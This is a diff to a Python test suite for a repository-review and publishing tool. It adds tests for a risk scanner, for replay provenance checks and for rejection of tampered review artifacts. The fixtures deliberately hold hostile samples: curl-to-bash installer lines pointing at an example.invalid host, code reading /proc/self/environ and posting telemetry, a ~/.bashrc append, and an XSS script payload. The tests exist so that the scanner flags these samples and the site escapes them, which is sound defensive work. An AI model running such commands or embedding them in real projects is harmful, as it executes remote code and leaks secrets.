@@ -126,6 +126,22 @@ def plan_raw() -> dict[str, object]:
     }
 
 
+def execution_provenance() -> dict[str, object]:
+    return {
+        "execution_contract_sha256": "a" * 64,
+        "dependency_bundle_sha256": "b" * 64,
+        "candidate_network": "none",
+        "track": "python-cli",
+        "toolchain": "Python 3.12",
+        "entrypoint": "tool",
+        "entrypoint_installed": True,
+        "installation_method": "offline source install",
+        "install_controls": ["offline"],
+        "install_adjustments": [],
+        "manual_interventions": 0,
+    }
+
+
 def daily_candidate(repository: str, sources: list[str], description: str) -> dict[str, object]:
     owner, name = repository.split("/")
     now = datetime(2026, 8, 14, tzinfo=UTC)
@@ -674,6 +690,8 @@ The 4 GB model download is optional.
             archive.write_bytes(b"trusted transport bytes")
             tree = source_tree_report(source)
             repository = {
+                "repository": "owner/tool",
+                "url": "https://github.com/owner/tool",
                 "commit_sha": "a" * 40,
                 "archive_sha256": hashlib.sha256(archive.read_bytes()).hexdigest(),
                 "source_tree_sha256": tree["sha256"],
@@ -710,6 +728,63 @@ The 4 GB model download is optional.
             )
             self.assertEqual(report.classification, TrustClass.REVIEW)
             self.assertIn("pipe_to_shell", {finding.category for finding in report.findings})
+
+    def test_risk_gate_scans_extensionless_scripts_but_not_binary_text(self) -> None:
+        with tempfile.TemporaryDirectory() as temporary:
+            source = Path(temporary)
+            installer = source / "install"
+            installer.write_text("#!/bin/sh\ncurl https://example.invalid/x | bash\n")
+            installer.chmod(0o755)
+            binary = source / "payload"
+            binary.write_bytes(b"\x00curl https://example.invalid/hidden | bash\n")
+            binary.chmod(0o755)
+            report = assess_risk(
+                source,
+                {
+                    "license": "MIT",
+                    "created_at": "2020-01-01T00:00:00Z",
+                    "stars": 5_000,
+                    "contributors_sample": 10,
+                },
+            )
+            pipe_findings = [
+                finding for finding in report.findings if finding.category == "pipe_to_shell"
+            ]
+            self.assertEqual([finding.path for finding in pipe_findings], ["install"])
+            self.assertIn(
+                ("opaque_executable", "payload"),
+                {(finding.category, finding.path) for finding in report.findings},
+            )
+
+    def test_risk_gate_records_endpoints_telemetry_and_host_probes(self) -> None:
+        with tempfile.TemporaryDirectory() as temporary:
+            source = Path(temporary)
+            (source / "agent.py").write_text(
+                "import requests, sentry_sdk\n"
+                "requests.post('https://telemetry.example.invalid/collect')\n"
+                "sentry_sdk.init(dsn='https://dsn.example.invalid/1')\n"
+                "open('/proc/self/environ').read()\n"
+            )
+            (source / "profile.sh").write_text("#!/bin/sh\nprintf x >> ~/.bashrc\n")
+            report = assess_risk(
+                source,
+                {
+                    "license": "MIT",
+                    "created_at": "2020-01-01T00:00:00Z",
+                    "stars": 5_000,
+                    "contributors_sample": 10,
+                },
+            )
+            categories = {finding.category for finding in report.findings}
+            self.assertTrue(
+                {
+                    "host_process_probe",
+                    "shell_profile_modification",
+                    "telemetry",
+                    "outbound_endpoint",
+                }.issubset(categories)
+            )
+            self.assertEqual(report.classification, TrustClass.REVIEW)
 
     def test_ci_only_sudo_is_recorded_without_blocking_unrelated_execution(self) -> None:
         with tempfile.TemporaryDirectory() as temporary:
@@ -790,8 +865,26 @@ The 4 GB model download is optional.
             atomic_json(root / "two" / "response.json", {"total_cost_usd": 0.375})
             self.assertEqual(model_cost(root), 0.5)
 
+    def test_production_workflows_gate_deployment_and_write_credentials(self) -> None:
+        daily = (ROOT / ".github/workflows/daily.yml").read_text()
+        pages = (ROOT / ".github/workflows/pages.yml").read_text()
+        record = daily.split("\n  record:\n", 1)[1].split("\n  deploy:\n", 1)[0]
+        self.assertNotIn("workflow_dispatch", daily)
+        self.assertNotIn("workflow_dispatch", pages)
+        self.assertIn("needs: [evaluate, verify]", record)
+        self.assertIn("actions/deploy-pages", daily)
+        self.assertIn("python -m unittest discover -s tests -v", daily.split("\n  discover:\n", 1)[0])
+        self.assertIn("persist-credentials: false", record)
+        self.assertNotIn("pip install", record)
+        self.assertEqual(record.count("${{ github.token }}"), 1)
+        self.assertGreater(record.index("GITHUB_TOKEN:"), record.index("git commit"))
+        self.assertIn('requires = ["hatchling==1.27.0"]', (ROOT / "pyproject.toml").read_text())
+        for workflow in (daily, pages, (ROOT / ".github/workflows/ci.yml").read_text()):
+            self.assertNotIn("--site-url https://drj0e.github.io/worthit", workflow)
+
     def test_replay_comparison_detects_mismatch(self) -> None:
         run = {
+            **execution_provenance(),
             "status": "COMPLETE",
             "label": "one",
             "tests": [
@@ -808,6 +901,12 @@ The 4 GB model download is optional.
         changed["label"] = "two"
         changed["tests"][0]["exit_code"] = 1
         self.assertFalse(compare_replays(run, changed)["reproduced"])
+        changed = copy.deepcopy(run)
+        changed["execution_contract_sha256"] = "c" * 64
+        self.assertIn(
+            "clean run execution_contract_sha256 differed",
+            compare_replays(run, changed)["mismatches"],
+        )
         contract = TestPlan.from_dict(plan_raw(), [claim()], "test")
         first = execution_contract_sha256(contract, {}, {"image_id": "one"})
         second = execution_contract_sha256(contract, {}, {"image_id": "two"})
@@ -815,6 +914,7 @@ The 4 GB model download is optional.
 
     def test_replay_mismatch_stops_evaluation_and_persists_reason(self) -> None:
         final = {
+            **execution_provenance(),
             "status": "COMPLETE",
             "label": "final",
             "tests": [{"test_id": "T01", "status": "PASS", "exit_code": 0, "assertions": []}],
@@ -842,9 +942,11 @@ The 4 GB model download is optional.
 
     def test_publication_rejects_cross_artifact_tampering(self) -> None:
         template_path = next((ROOT / "reviews").rglob("review.json"))
+        template_review = json.loads(template_path.read_text())
+        owner, name = template_review["repository"].casefold().split("/", 1)
         with tempfile.TemporaryDirectory() as temporary:
             root = Path(temporary)
-            artifact = root / "reviews" / "owner" / "repo" / template_path.parent.name
+            artifact = root / "reviews" / owner / name / template_path.parent.name
             shutil.copytree(template_path.parent, artifact)
             score = json.loads((artifact / "score.json").read_text())
             original_score = copy.deepcopy(score)
@@ -864,6 +966,39 @@ The 4 GB model download is optional.
             with self.assertRaisesRegex(ValueError, "invalid review artifact"):
                 build_site(root / "reviews", root / "site")
             shutil.copyfile(template_path.parent / "replay.json", artifact / "replay.json")
+            replay = json.loads((artifact / "replay.json").read_text())
+            replay["execution_contract_sha256"] = "0" * 64
+            replay["dependency_bundle_sha256"] = "1" * 64
+            replay["candidate_network"] = "bridge"
+            atomic_json(artifact / "replay.json", replay)
+            fact["bundle_sha256"] = publication_bundle_sha256(artifact)
+            atomic_json(artifact / "fact-check.json", fact)
+            with self.assertRaisesRegex(ValueError, "invalid review artifact"):
+                build_site(root / "reviews", root / "site")
+            shutil.copyfile(template_path.parent / "replay.json", artifact / "replay.json")
+            dependency = json.loads((artifact / "dependency-fetch.json").read_text())
+            dependency["bundle_sha256"] = "1" * 64
+            atomic_json(artifact / "dependency-fetch.json", dependency)
+            fact["bundle_sha256"] = publication_bundle_sha256(artifact)
+            atomic_json(artifact / "fact-check.json", fact)
+            with self.assertRaisesRegex(ValueError, "invalid review artifact"):
+                build_site(root / "reviews", root / "site")
+            shutil.copyfile(
+                template_path.parent / "dependency-fetch.json", artifact / "dependency-fetch.json"
+            )
+            run = json.loads((artifact / "run.json").read_text())
+            replay = json.loads((artifact / "replay.json").read_text())
+            for execution in (run, replay):
+                execution["entrypoint"] = "different-binary"
+                execution["execution_contract_sha256"] = "0" * 64
+            atomic_json(artifact / "run.json", run)
+            atomic_json(artifact / "replay.json", replay)
+            fact["bundle_sha256"] = publication_bundle_sha256(artifact)
+            atomic_json(artifact / "fact-check.json", fact)
+            with self.assertRaisesRegex(ValueError, "invalid review artifact"):
+                build_site(root / "reviews", root / "site")
+            shutil.copyfile(template_path.parent / "run.json", artifact / "run.json")
+            shutil.copyfile(template_path.parent / "replay.json", artifact / "replay.json")
             review = json.loads((artifact / "review.json").read_text())
             review["tests"] = [copy.deepcopy(review["tests"][0]) for _ in review["tests"]]
             review["claim_matrix"] = [
@@ -873,6 +1008,41 @@ The 4 GB model download is optional.
             (artifact / "review.md").write_text(render_markdown(review))
             fact["bundle_sha256"] = publication_bundle_sha256(artifact)
             atomic_json(artifact / "fact-check.json", fact)
+            with self.assertRaisesRegex(ValueError, "invalid review artifact"):
+                build_site(root / "reviews", root / "site")
+
+    def test_publication_rejects_repository_relabeling(self) -> None:
+        template_path = next((ROOT / "reviews").rglob("review.json"))
+        review = json.loads(template_path.read_text())
+        owner, name = review["repository"].casefold().split("/", 1)
+        with tempfile.TemporaryDirectory() as temporary:
+            root = Path(temporary)
+            artifact = root / "reviews" / owner / name / review["commit_sha"]
+            shutil.copytree(template_path.parent, artifact)
+            review["project"] = "Completely Different Product"
+            atomic_json(artifact / "review.json", review)
+            (artifact / "review.md").write_text(render_markdown(review))
+            fact = json.loads((artifact / "fact-check.json").read_text())
+            fact["bundle_sha256"] = publication_bundle_sha256(artifact)
+            atomic_json(artifact / "fact-check.json", fact)
+            with self.assertRaisesRegex(ValueError, "invalid review artifact"):
+                build_site(root / "reviews", root / "site")
+            review.update(
+                {
+                    "project": "fake-project",
+                    "repository": "fake-owner/fake-project",
+                    "repository_url": "https://github.com/fake-owner/fake-project",
+                }
+            )
+            atomic_json(artifact / "review.json", review)
+            (artifact / "review.md").write_text(render_markdown(review))
+            fact["bundle_sha256"] = publication_bundle_sha256(artifact)
+            atomic_json(artifact / "fact-check.json", fact)
+            with self.assertRaisesRegex(ValueError, "invalid review artifact"):
+                build_site(root / "reviews", root / "site")
+            relabeled = root / "reviews" / "fake-owner" / "fake-project" / review["commit_sha"]
+            relabeled.parent.mkdir(parents=True)
+            artifact.rename(relabeled)
             with self.assertRaisesRegex(ValueError, "invalid review artifact"):
                 build_site(root / "reviews", root / "site")
 
@@ -986,9 +1156,11 @@ The 4 GB model download is optional.
 
     def test_publication_requires_every_cited_evidence_file(self) -> None:
         template_path = next((ROOT / "reviews").rglob("review.json"))
+        review = json.loads(template_path.read_text())
+        owner, name = review["repository"].casefold().split("/", 1)
         with tempfile.TemporaryDirectory() as temporary:
             root = Path(temporary)
-            artifact = root / "reviews" / "owner" / "repo" / template_path.parent.name
+            artifact = root / "reviews" / owner / name / template_path.parent.name
             shutil.copytree(template_path.parent, artifact)
             run = json.loads((artifact / "run.json").read_text())
             missing = run["tests"][0]["evidence"][0]
@@ -1093,7 +1265,6 @@ The 4 GB model download is optional.
         review = json.loads(template_path.read_text())
         original_score = review["score"]["overall"]
         attack = '</title><script>alert("x")</script><img src=x onerror=alert(1)>'
-        review["project"] = attack
         review["summary"] = attack
         claim_index = next(
             index
@@ -1104,7 +1275,8 @@ The 4 GB model download is optional.
         review["tests"][0]["purpose"] = attack
         with tempfile.TemporaryDirectory() as temporary:
             root = Path(temporary)
-            artifact = root / "reviews" / "owner" / "repo" / review["commit_sha"]
+            owner, name = review["repository"].casefold().split("/", 1)
+            artifact = root / "reviews" / owner / name / review["commit_sha"]
             shutil.copytree(template_path.parent, artifact)
             claims = json.loads((artifact / "claims.json").read_text())
             plan = json.loads((artifact / "test-plan.json").read_text())
@@ -1119,6 +1291,13 @@ The 4 GB model download is optional.
             atomic_json(artifact / "fact-check.json", fact)
             site = root / "site"
             self.assertEqual(build_site(root / "reviews", site), 1)
+            with self.assertRaisesRegex(ValueError, "site URL must be an HTTP.* origin"):
+                build_site(
+                    root / "reviews",
+                    site,
+                    base_path="/worthit/",
+                    site_url="https://drj0e.github.io/worthit",
+                )
             rendered = next((site / "reviews").rglob("index.html")).read_text()
             self.assertNotIn("<script>", rendered)
             self.assertNotIn("<img", rendered)
@@ -1148,7 +1327,7 @@ The 4 GB model download is optional.
         owner, name = review["repository"].split("/")
         with tempfile.TemporaryDirectory() as temporary:
             root = Path(temporary)
-            artifact = root / "reviews" / owner / name / review["commit_sha"]
+            artifact = root / "reviews" / owner.casefold() / name.casefold() / review["commit_sha"]
             shutil.copytree(template_path.parent, artifact)
             original = (artifact / "review.json").read_bytes()
             correction_path = (
